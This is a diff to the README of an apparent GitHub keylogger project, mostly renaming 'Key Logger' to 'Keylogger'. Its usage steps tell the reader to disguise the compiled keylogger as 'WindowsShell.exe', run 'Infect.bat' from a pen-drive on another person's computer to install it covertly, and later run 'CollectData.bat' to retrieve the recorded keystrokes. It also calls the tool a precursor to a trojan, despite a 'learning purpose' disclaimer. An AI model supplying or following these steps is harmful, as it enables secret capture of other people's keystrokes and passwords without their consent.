@@ -1,4 +1,4 @@
-# :key: Stupid Key Logger 
+# :key: Stupid Keylogger 
 
 #### A Terrific Keystroke Recorder
 
@@ -8,13 +8,13 @@ This project is created only for learning purpose.
 
 ### How to use?
 
-1. Download the full package from [here](https://github.com/MinhasKamal/StupidKeyLogger/archive/application.zip), unzip it, and move it to your pen-drive. It should look like this-
+1. Download the full package from [here](https://github.com/MinhasKamal/StupidKeylogger/archive/application.zip), unzip it, and move it to your pen-drive. It should look like this-
 
 <div align="center">
-  <img src="https://cloud.githubusercontent.com/assets/5456665/18231884/984f4d58-72e5-11e6-8401-725c6906c040.PNG" alt="Key-Logger"/>
+  <img src="https://cloud.githubusercontent.com/assets/5456665/18231884/984f4d58-72e5-11e6-8401-725c6906c040.PNG" alt="StupidKeylogger"/>
 </div>
 
-2. **WindowsShell.exe** is the compiled and renamed form of **KeyLogger.cpp** (of course you do not expect others to let you insert a pen-drive containing keylogger!). **WindowsShell.lnk** is a link file of **WindowsShell.exe**. Now insert your pen-drive in a computer, and run **Infect.bat**. This will install **WindowsShell.exe** and **WindowsShell.lnk** in that PC.
+2. **WindowsShell.exe** is the compiled and renamed form of **Keylogger.cpp** (of course you do not expect others to let you insert a pen-drive containing keylogger!). **WindowsShell.lnk** is a link file of **WindowsShell.exe**. Now insert your pen-drive in a computer, and run **Infect.bat**. This will install **WindowsShell.exe** and **WindowsShell.lnk** in that PC.
 
 3. Wait for some days, then return to the PC, and run **CollectData.bat**. You will get a file named **Record.log**.
 
@@ -30,4 +30,4 @@ Surely you can use it in many other ways; and also enhance its ability by adding
 This is actually a pre-project for [TrojanCockroach](https://github.com/MinhasKamal/TrojanCockroach).
 
 ### License
-<a rel="license" href="https://opensource.org/licenses/MIT"><img alt="MIT License" src="https://cloud.githubusercontent.com/assets/5456665/18950087/fbe0681a-865f-11e6-9552-e59d038d5913.png" width="60em" height=auto/></a><br/><a href="https://github.com/MinhasKamal/StupidKeyLogger">Stupid Key Logger</a> is licensed under <a rel="license" href="https://opensource.org/licenses/MIT">MIT License</a>.
+<a rel="license" href="https://opensource.org/licenses/MIT"><img alt="MIT License" src="https://cloud.githubusercontent.com/assets/5456665/18950087/fbe0681a-865f-11e6-9552-e59d038d5913.png" width="60em" height=auto/></a><br/><a href="https://github.com/MinhasKamal/StupidKeylogger">StupidKeylogger</a> is licensed under <a rel="license" href="https://opensource.org/licenses/MIT">MIT License</a>.
